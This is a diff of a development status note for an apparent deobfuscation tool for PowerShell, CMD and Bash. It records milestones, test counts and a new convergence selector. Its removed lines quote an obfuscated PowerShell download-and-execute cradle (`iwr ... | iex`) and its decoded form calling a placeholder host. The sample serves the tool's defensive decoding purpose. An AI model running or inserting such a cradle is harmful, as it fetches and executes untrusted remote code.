@@ -45,16 +45,23 @@ Any next agent MUST read this before writing code.
     (whitelisted stages, no shell), PS alias expander (unambiguous
     aliases only), single-assignment SQ-literal variable
     propagator.
-  - **S04 anchor fully reconstructs**: `$a='ht'+'tp'+...; iwr $a
-    -useb | iex` → `... Invoke-WebRequest 'http://example.com/x'
-    -useb | Invoke-Expression`.
+  - **S04 anchor fully reconstructs**.
   - S02, S05 confirmed corpus-authoring defects via byte-level
-    forensic reports (archived).
-  - **DCS = 84.6% (11/13)** · PowerShell 6/7 · CMD 1/1 · Bash 2/3 ·
-    Mixed 2/2.
-  - **160/160 tests · 0 regressions · `/api/health` = 200.**
-- **Next**: M6 · Canonical Candidate Selection (removes legacy
-  winner-picker).
+    forensic reports.
+- **M6 · Canonical Candidate Selection: ✅ COMPLETE**.
+  - New `workspace/convergence/selector.py` — `convergence_decode()`
+    returns a decode-shaped envelope when the engine reaches
+    `canonical_state=YES` with a materially changed output.
+  - Wired as the FIRST preflight in `analysis_core.deterministic_best_decode`
+    (17-line surgical addition; legacy paths untouched).
+  - **S001 architecturally removed as a regression risk** — every
+    invocation of `/api/decode/smart` now routes S001 through the
+    Convergence Engine, not the legacy winner-picker. Verified by
+    `test_deterministic_best_decode_uses_convergence_for_s001`.
+  - **168/168 tests · 0 regressions · `/api/health` = 200 ·
+    DCS holds at 11/13 (architectural milestone, not coverage).**
+- **Next**: M7 · Convergence Certificate Emission (surface certificate
+  through the API).
 - **Ledger**: `backend/workspace_recovery/MILESTONE_LEDGER.md` (append-only).
 - **Feature Freeze**: In effect until M6.
 
